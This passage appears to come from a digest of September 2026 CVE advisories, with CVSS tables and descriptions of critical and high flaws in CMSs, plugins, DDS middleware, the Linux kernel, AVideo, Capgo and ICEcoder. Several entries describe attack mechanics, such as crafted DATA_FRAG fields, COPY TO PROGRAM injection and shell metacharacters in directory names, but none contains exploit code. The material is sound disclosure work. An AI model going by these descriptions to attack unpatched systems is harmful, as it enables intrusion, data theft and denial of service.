MaxSite CMS through 109.6 passes the ci_session cookie to unserialize() without class restrictions, allowing unauthenticated attackers to inject PHP objects. Attackers can forge valid session cookies using the hardcoded encryption key to trigger magic methods and corrupt application state or achieve code execution if gadget classes exist.

### CVE-2026-78361

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H` |
| Weaknesses | `CWE-862` |
| Published | 2026-09-10T07:17:03.143 |

The zipMoney(Zip Co) Payments Plugin for WooCommerce WordPress plugin before 2.4.0 does not perform any authorisation checks on one of its front-end request handlers, and does not restrict which option name a caller may supply, allowing unauthenticated users to delete arbitrary WordPress options. This can be used to destroy site and access control configuration, deactivate every installed zipMoney(Zip Co) Payments Plugin for WooCommerce WordPress plugin before 2.4.0, and take the site offline.

### CVE-2026-22590

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H` |
| Weaknesses | `CWE-125;CWE-131` |
| Published | 2026-09-09T16:17:02.387 |

eprosima Fast DDS is a C++ implementation of the DDS (Data Distribution Service) standard of the OMG (Object Management Group). Versions prior to 2.6.12, 2.14.6, 3.2.4, 3.3.1, and 3.4.2 have a remotely triggerable Out-of-Bounds Read while processing RTPS `DATA_FRAG` submessages. An attacker can craft a `DATA_FRAG` with a large `sampleSize` but a small actual payload, and set `fragmentsInSubmessage` such that the receiver treats the packet as the LAST fragment**. In this LAST-fragment path, Fast-DDS computes `incoming_length` based on `sampleSize` and calls `memcpy()` without validating `incoming_data.length >= incoming_length`. As a result, `CacheChange_t::add_fragments()` reads past the received UDP datagram buffer and into adjacent heap memory, copying those bytes into the reassembly buffer. In a Discovery Server deployment, the resulting `CacheChange_t` can be relayed to other participants, meaning that a newly joining participant may receive leaked heap memory (e.g., pointer values that could aid ASLR bypass). Versions 2.6.12, 2.14.6, 3.2.4, 3.3.1, and 3.4.2 fix the issue.

### CVE-2026-87911

| 項目 | 値 |
|------|-----|
| CVSS | `9.0` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-78;CWE-184` |
| Published | 2026-09-09T20:21:02.017 |

An OS command injection weakness in the read-only enforcement of the SQL validation component in Amazon awslabs postgres-mcp-server before 1.1.7 might allow an unauthenticated actor to execute operating system commands on the host of a self-managed PostgreSQL server by placing a crafted COPY ... TO PROGRAM statement into content that is processed when an authenticated user interacts with the MCP server in its default read-only mode.



To remediate this issue, users should upgrade to version 1.1.7 or later.

### CVE-2026-68484

| 項目 | 値 |
|------|-----|
| CVSS | `9.0` |
| Vector | `CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-862` |
| Published | 2026-09-09T16:17:04.157 |

Cash Collect contains an improper authorization vulnerability in the Sage AR Automation API. Administrative functions do not properly verify user privileges, allowing authenticated low-privileged users to create administrator accounts and obtain elevated privileges.

### CVE-2026-67403

| 項目 | 値 |
|------|-----|
| CVSS | `9.0` |
| Vector | `CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-639` |
| Published | 2026-09-09T16:17:04.030 |

Cash Collect contains an improper authorization vulnerability in the Sage AR Automation API. Insufficient tenant-level authorization checks allow authenticated users to access administrative resources belonging to other tenants by specifying a valid non predictable tenant identifier.

## 🟠 High（CVSS 7.0〜9.0 未満）

### CVE-2026-88277

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2026-09-10T09:17:04.673 |

GeoVision GV-LPC2211 V1.13 allows an authenticated ONVIF user to inject shell commands through ConsumerReference.Address and execute arbitrary commands as root.

### CVE-2026-88271

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-862` |
| Published | 2026-09-10T09:17:04.003 |

GeoVision GV-LPC2211 V1.13 allows a Guest user to overwrite device configuration and replace the administrator password through SSVR.

### CVE-2026-87927

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-98` |
| Published | 2026-09-09T17:17:53.520 |

MaxSite CMS through 109.6 contains a local file inclusion vulnerability in the ajax and require-maxsite dispatchers that allows unauthenticated attackers to execute privileged handler files by supplying base64-encoded path traversal sequences. Attackers can bypass path validation checks and execute admin-gated handler actions without authentication to access sensitive functionality.

### CVE-2026-80921

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `N/A` |
| Published | 2026-09-09T17:17:47.240 |

In the Linux kernel, the following vulnerability has been resolved:

KVM: s390: vsie: zero stale crypto bits

When shadowing crypto access bits from a format0 apcb (crycb 0 or 1),
the bits 64..255 are unchanged from whatever is in the vsie page in the
crycb and thus in the apcb. This gives a nested guest potential access
to a device no longer available. Zero out the remaining bits.

### CVE-2026-80914

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `N/A` |
| Published | 2026-09-09T17:17:46.263 |

In the Linux kernel, the following vulnerability has been resolved:

Bluetooth: ISO: fix use-after-free of listener socket in iso_conn_ready

iso_conn_ready() looks up the BIS listener socket with iso_get_sock(),
which takes a reference, and then, without re-checking its state,
creates a child socket from it:

    parent = iso_get_sock(hdev, ...);
    if (!parent)
        return;

    lock_sock(parent);
    sk = iso_sock_alloc(sock_net(parent), NULL, BTPROTO_ISO, ...);
    ...
    iso_chan_add(conn, sk, parent);
    ...
    release_sock(parent);
    sock_put(parent);

If the listener socket is closed concurrently, between iso_get_sock()
and lock_sock(), the reference taken by iso_get_sock() may be the last
one: the close path drops the link-list reference, and once
iso_conn_ready() drops its own reference at the end of the function the
socket is freed.  The child socket, however, is already linked to the
freed parent, and a later disconnect of the child runs iso_chan_del()
-> bt_accept_unlink(), which dereferences the dangling parent pointer
into the freed accept queue (a use-after-free).  The same dangling
pointer is also dereferenced through parent->***() in
iso_chan_del().

Fix it the same way the connected (non-BIS) path was fixed in commit
0d255e63fcf3 ("Bluetooth: ISO: hold sk properly in iso_conn_ready"):
after taking the socket lock, re-check that the parent is still a
listening, alive socket, and bail out otherwise.

### CVE-2026-87823

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-190` |
| Published | 2026-09-09T15:17:27.583 |

zstd-jni before 1.5.7-14 performs 32-bit signed bounds checks on three direct-ByteBuffer frame-size native methods, allowing out-of-bounds memory reads via negative or overflowing offsets. Attackers can supply negative offset values near Integer.MIN_VALUE to read unmapped memory, causing JVM termination or extracting arbitrary frame size data from unintended memory locations.

### CVE-2026-88893

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-200` |
| Published | 2026-09-10T14:17:18.620 |

OpenPanel share lookup procedures fail to validate access controls and return password hashes and protected report definitions to unauthenticated callers. Attackers with a share link can retrieve argon2id password hashes and full report configurations including event names, filters, and breakdown dimensions for offline password cracking and business intelligence theft.

### CVE-2026-88876

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-200` |
| Published | 2026-09-10T14:17:15.877 |

AVideo through revision c3edcc274c389816d434acadac07ee78eaf330c1 contains a missing authorization vulnerability in plugin/PlayerSkins/seo.php that allows unauthenticated attackers to access password-protected video sources by calling getSources() without password validation. Attackers can request the seo.php endpoint with a video ID to obtain the direct MP4 URL and read protected media bytes without supplying the configured password.

### CVE-2026-88874

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-200` |
| Published | 2026-09-10T14:17:15.593 |

AVideo through revision c3edcc274c389816d434acadac07ee78eaf330c1 (master, 2026-08-23) does not enforce the Live stream password check on the stats endpoint or on the HLS origin. Live::_getStats() (plugin/Live/Live.php) returns a password-protected transmission's RTMP stream key, its isPasswordProtected flag, and its HLS (m3u8) URL to unauthenticated callers, in both the public applications list and the hidden_applications branch used when canSeeLiveFromLiveKey() fails. Separately, the shipped NGINX configuration (deploy/nginx/nginx.conf) serves the .m3u8 playlist, the AES-128 key, and the transport-stream segments from the /live location without any auth_request (the auth_key_check directive in the .key location is commented out). A remote, unauthenticated attacker can therefore retrieve the stream key and decryption key and watch a password-protected live transmission without supplying the configured password. No patched version was available at the time of the advisory.

### CVE-2026-88862

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-863` |
| Published | 2026-09-10T14:17:11.820 |

Capgo (capgo.app) backend through 12.242.4 does not validate parent-child delegation when processing the x-limited-key-id header. checkKeyByIdPg() in supabase/functions/_backend/utils/hono_middleware.ts resolves the attacker-supplied numeric API key ID using only the key ID, its expiration state, and the authenticating key's user_id, while hasLimitedRbacSubkeyScope() accepts any key with a non-organization (e.g., app-scoped) RBAC binding and validateSubkeyUser() only compares owning user IDs. Because Capgo treats API keys as independent RBAC principals with separate role bindings, an authenticated apikey_manager API key with no application access can supply the numeric ID of a more privileged same-owner key and have the middleware replace the authenticated principal and effective API-key secret with that key (setSubkeyAuthContext), exercising an app_admin sibling's permissions without knowing or submitting its secret. The issue was reproduced on release 12.242.4 (commit b3d02cdbc23ac59990785acacd1f113c07458568) after the fix for GHSA-8h52-44r7-w343; at the time of the advisory no patched version was available.

### CVE-2026-88861

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-288` |
| Published | 2026-09-10T14:17:11.673 |

Capgo (Cap-go/capgo.app) contains an authentication bypass affecting all versions (no patched version available at time of publication). The Edge authorization path allows a password-only Supabase aal1 session to exercise privileged RBAC permissions even when the account has a verified MFA factor that has not been used for the session: the Edge JWT middleware (foundJWT() in supabase/functions/_backend/utils/hono_middleware.ts) accepts the JWT without validating its assurance level, and the direct RBAC path (checkPermission()/checkPermissionPg() in supabase/functions/_backend/utils/rbac.ts calling public.rbac_check_permission_direct()) authorizes by user ID without passing or checking the session aal, unlike the public.verify_mfa() control which correctly requires aal2. An attacker who knows only the victim's password can therefore authenticate, mint a persistent app-scoped app_admin API key that remains valid after the aal1 session is logged out, and perform privileged operations such as modifying production OTA channel configurations (validated by changing a public production channel from bundle 1.0.0 to 1.0.1), defeating the protection provided by MFA.

### CVE-2026-75584

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-617` |
| Published | 2026-09-10T14:17:07.467 |

ION-DTN before 4.2.1-a.1 contains a denial of service vulnerability that allows unauthenticated remote attackers to crash the ION process by sending a BPv7 bundle with a zero-length payload. The canonicalizePayloadBlock() function in bpsec_util.c passes bundle->payload.length to zco_clone() without validating it against zero, causing a failed CHKZERO assertion that triggers sm_Abort() and terminates the process with SIGABRT before any HMAC verification occurs, requiring no valid key or credential to exploit.

### CVE-2026-64838

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-22` |
| Published | 2026-09-10T14:17:03.823 |

ICEcoder versions through 8.1 fail to properly validate the oldFileName parameter in file move and rename operations, allowing authenticated users to relocate files from outside the document root. Attackers can use path traversal sequences in oldFileName to move files writable by the PHP process into the web-accessible project directory, disclosing file contents and deleting originals.

### CVE-2026-64837

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-78` |
| Published | 2026-09-10T14:17:03.570 |

ICEcoder through 8.1 passes an unescaped filesystem path into a shell command in lib/properties.php, allowing authenticated users to inject OS commands through directory names. Attackers can create directories with shell metacharacters in their names and access the Properties function to execute arbitrary commands as the web-server user via popen().

### CVE-2026-64836

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-22;CWE-697` |
| Published | 2026-09-10T14:17:03.317 |

ICEcoder versions through 8.1 contain a path traversal vulnerability in the file-control endpoint due to a logic error in the document-root confinement check. The File::check() validation function compares realpath() to boolean true, which never succeeds, allowing authenticated attackers to submit traversal sequences or absolute paths in the file parameter to read, write, or delete files outside the configured document root.

### CVE-2026-87962

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-1284` |
| Published | 2026-09-10T11:17:07.763 |

t-digest versions 3.1 through 3.3 contain a denial of service vulnerability in MergingDigest.fromBytes that fails to validate length and capacity fields from serialized data. Attackers can supply crafted serialized digests with mismatched header fields to trigger ArrayIndexOutOfBoundsException or NegativeArraySizeException, aborting the parsing thread.

### CVE-2026-87995

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N` |
| Weaknesses | `CWE-79;CWE-1021` |
| Published | 2026-09-09T22:18:47.710 |

Open WebUI is an extensible, feature-rich, and user-friendly self-hosted AI platform. From 0.8.11 until 0.11.1, src/lib/components/chat/FileNav/PortPreview.svelte rendered terminal port content in an iframe sandbox containing both allow-scripts and allow-same-origin. Because the terminal proxy serves that content from the Open WebUI origin, an authenticated user with access to a shared terminal server could host script on a previewed port and take over a victim's account when the victim opened the preview. This issue is fixed in version 0.11.1.

### CVE-2026-77120

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:L/AC:L/AT:P/PR:H/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-78` |
| Published | 2026-09-09T17:17:41.997 |

CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') vulnerability exists that could cause privilege escalation to root and unauthorized execution of administrative functions when an authenticated user with SSH enabled interacts with the operating system console that improperly processes user-controlled input.

### CVE-2026-81640

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-798` |
| Published | 2026-09-09T16:17:10.567 |

An attacker could derive the camera's Wi-Fi password and connect to its wireless network. This weakens or eliminates the security value of the access-point password and may expose the live video stream, device services, status interfaces, and firmware-update functionality.

### CVE-2026-87824

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-125` |
| Published | 2026-09-09T15:17:27.753 |

zstd-jni before 1.5.7-14 fails to validate the samples buffer capacity in Zstd.trainFromBufferDirect, allowing attackers to read past buffer boundaries by supplying oversized per-sample lengths. Attackers can trigger out-of-bounds memory access by providing crafted sample length arrays that cause the native implementation to walk past the buffer allocation, resulting in JVM termination.

### CVE-2026-87822

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-407` |
| Published | 2026-09-09T15:17:27.427 |

t-digest versions 3.1 through 3.3 fail to validate centroid means during deserialization in MergingDigest.fromBytes, allowing attackers to inject NaN values that bypass validation checks. Attackers can craft malicious serialized digests containing NaN centroids that degrade sorting performance from O(n log n) to O(n squared), causing severe processing delays during merge operations.

### CVE-2026-88895

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-287` |
| Published | 2026-09-10T14:17:18.907 |

CyberPanel before 3.0.5 fails to enforce two-factor authentication on API endpoints, allowing attackers to bypass TOTP requirements using password-derived tokens. Attackers who obtain an administrator's password can derive API tokens and perform administrative operations or create authenticated sessions without the second factor.

### CVE-2026-88865

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-639` |
| Published | 2026-09-10T14:17:12.630 |

AVideo through commit c3edcc274c389816d434acadac07ee78eaf330c1 fails to validate restream ownership in getRestream.json.php, allowing authenticated users with canStream permission to mint tokens for arbitrary restreams. Attackers can exchange the token to retrieve other users' stream keys from getLiveKey.json.php and publish to their YouTube, Twitch, or RTMP destinations.

### CVE-2026-88863

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-269` |
| Published | 2026-09-10T14:17:11.970 |

capgo.app (npm package `capgo`) through version 12.207.1 does not compare the caller's role rank against the requested role in the validateInvite() function of supabase/functions/_backend/private/invite_new_user_to_org.ts. The POST /private/invite_new_user_to_org endpoint only requires the org.update_user_roles permission for org_super_admin invitations, so an authenticated user holding only the org.invite_user permission (e.g., an org_member) can invite an external user as org_admin or org_billing_admin. When the invited account accepts the invitation via POST /private/accept_invitation, ensureOrgMembership creates the role binding using the Supabase service-role key, which bypasses the prevent_role_binding_priority_escalation and check_org_user_privileges database triggers. This allows privilege escalation resulting in full administrative control over the organization's apps, channels, members, and billing. The issue is addressed by pull request #3096, which compares the inviter's rank before permitting elevated invitations.

### CVE-2026-85217

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-15` |
| Published | 2026-09-10T14:17:09.380 |

A maliciously crafted add-in, when installed and executed in Autodesk Fusion Desktop, can modify persistent network proxy settings without user notification or consent. A successful exploit may allow an attacker to redirect authenticated Fusion network traffic through an attacker-controlled proxy, potentially exposing sensitive information with the current user.

### CVE-2026-78302

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-79` |
| Published | 2026-09-10T10:17:32.250 |

Joomla Extension - joomshaper.com - Unauthenticated Stored Cross-Site Scripting (XSS) via Unescaped Output in Views and Admin Lists in SP Property < 4.1.4 - Multiple template files across frontend views and administrator list tables rendered attributes and text values directly into HTML without contextual escaping.

### CVE-2026-87931

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-119;CWE-120` |
| Published | 2026-09-10T00:17:24.737 |

A vulnerability has been found in Behavioral Technology Group Pavlok Behavioral Conditioning Wearable up to 20260707. Impacted is an unknown function of the component Apple Notification Center Service Event Handler. The manipulation leads to buffer overflow. The attack must be carried out from within the local network. The vendor was contacted early about this disclosure but did not respond in any way.

### CVE-2026-79322

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L` |
| Weaknesses | `CWE-89` |
| Published | 2026-09-09T19:17:47.900 |

SQL injection in the RelatedProduct block in Mageplaza Blog for Magento 2 (mageplaza/magento-2-blog-extension) through 4.3.2 allows remote unauthenticated attackers to execute arbitrary SQL commands and read arbitrary database contents via the id parameter to /mpblog/post/view.

### CVE-2026-8044

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-88` |
| Published | 2026-09-09T17:17:54.137 |

CWE-88: Improper Neutralization of Argument Delimiters in a Command ('Argument Injection') vulnerability exists that could cause remote code execution by an attacker with a privileged account when malicious arguments are provided as backup configuration parameters.

### CVE-2026-19233

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-918` |
| Published | 2026-09-09T17:17:17.783 |

CWE-918: Server-Side Request Forgery (SSRF) vulnerability exists that could cause unauthorized command execution and disclosure of server data when an attacker with a privileged account sends crafted, unvalidated parameters to a server endpoint.

### CVE-2026-26212

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-434` |
| Published | 2026-09-09T15:17:06.823 |

Rara One Click Demo Import plugin for WordPress before 1.3.5 contains an arbitrary file upload vulnerability that allows authenticated attackers with Administrator privileges to upload arbitrary PHP files by passing a false value to wp_handle_upload() that disables WordPress core's file type validation checks across all three file parameters in the process_uploaded_files() function. Attackers can upload a malicious PHP file to the uploads directory and execute it over HTTP to achieve remote code execution in the web server process, with the uploaded file persisting on disk even after plugin deactivation and leaving no media library record to evade standard integrity checks.

### CVE-2026-88889

| 項目 | 値 |
|------|-----|
| CVSS | `8.5` |
| Vector | `CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-78` |
| Published | 2026-09-10T14:17:18.033 |

